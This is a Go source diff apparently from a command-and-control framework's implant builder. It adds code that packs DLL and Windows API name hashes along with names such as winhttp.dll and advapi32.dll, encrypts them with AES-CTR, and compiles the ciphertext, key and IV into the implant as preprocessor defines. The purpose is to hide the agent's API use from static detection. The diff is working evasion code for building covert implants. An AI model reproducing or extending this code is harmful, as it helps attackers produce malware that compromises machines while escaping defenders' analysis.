@@ -79,11 +79,7 @@ func NewImplantBuilder(ImpConfig *Types.ImplantConfig, path string) *AgentBuilde
 	 */
 
 	/*
-
-		C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx86\x86\cl.exe //x86
-		C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx64\x64\cl.exe //x64
-			C:\Strawberry\c\bin\x86_64-w64-mingw32-gcc.exe //x64
-
+		C:\Strawberry\c\bin\x86_64-w64-mingw32-gcc.exe //x64
 	*/
 	//TODO remove the debug flag setting here.
 	if !builder.CompilerOptions.Config.DebugDev {
@@ -146,6 +142,50 @@ func (ab *AgentBuilder) Build() bool {
 		log.Println("[error] attempting to create patch config: ", err)
 		return false
 	}
+	HashConfig := Packer.Packer{}
+	for _, v := range Types.DllNameHashes {
+		HashConfig.AddUInt64(v)
+	}
+	for _, v := range Types.ApiNameHashes {
+		HashConfig.AddUInt64(v)
+	}
+	HashConfig.AddString("advapi32.dll")
+	HashConfig.AddString("winhttp.dll")
+	HashConfig.AddString("User32.dll")
+	HashConfig.AddString("iphlpapi.dll")
+	EncryptedHashConfig, HashKey, HashIv, err := Crypt.AESCTREncrypt(HashConfig.GetBuffer())
+	if err != nil {
+		log.Println("[error] attempting to encrypt config: ", err)
+		return false
+	}
+	EncryptedHashConfigByteString := "{"
+	for i := range EncryptedHashConfig {
+		if i == (len(EncryptedHashConfig) - 1) {
+			EncryptedHashConfigByteString += fmt.Sprintf("0x%02x", EncryptedHashConfig[i])
+		} else {
+			EncryptedHashConfigByteString += fmt.Sprintf("0x%02x,", EncryptedHashConfig[i])
+		}
+	}
+	EncryptedHashConfigByteString += "}"
+	HashKeyString := "{"
+	for i := range HashKey {
+		if i == (len(HashKey) - 1) {
+			HashKeyString += fmt.Sprintf("0x%02x", HashKey[i])
+		} else {
+			HashKeyString += fmt.Sprintf("0x%02x,", HashKey[i])
+		}
+	}
+	HashKeyString += "}"
+
+	HashIvString := "{"
+	for i := range HashIv {
+		if i == (len(HashIv) - 1) {
+			HashIvString += fmt.Sprintf("0x%02x", HashIv[i])
+		} else {
+			HashIvString += fmt.Sprintf("0x%02x,", HashIv[i])
+		}
+	}
+	HashIvString += "}"
 
 	//encrypt the config bytes
 	EncryptedConfig, Key, Iv, err := Crypt.AESCTREncrypt(Config)
@@ -188,6 +228,9 @@ func (ab *AgentBuilder) Build() bool {
 	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
 	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_KEY_BYTES="+KeyByteString)
 	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_IV_BYTES="+IvByteString)
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "HASH_CONFIG_BYTES="+EncryptedHashConfigByteString)
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "HASH_KEY_BYTES="+HashKeyString)
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "HASH_IV_BYTES="+HashIvString)
 
 	if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
 		abs, err := filepath.Abs(ab.CompilerOptions.Config.Compiler64)
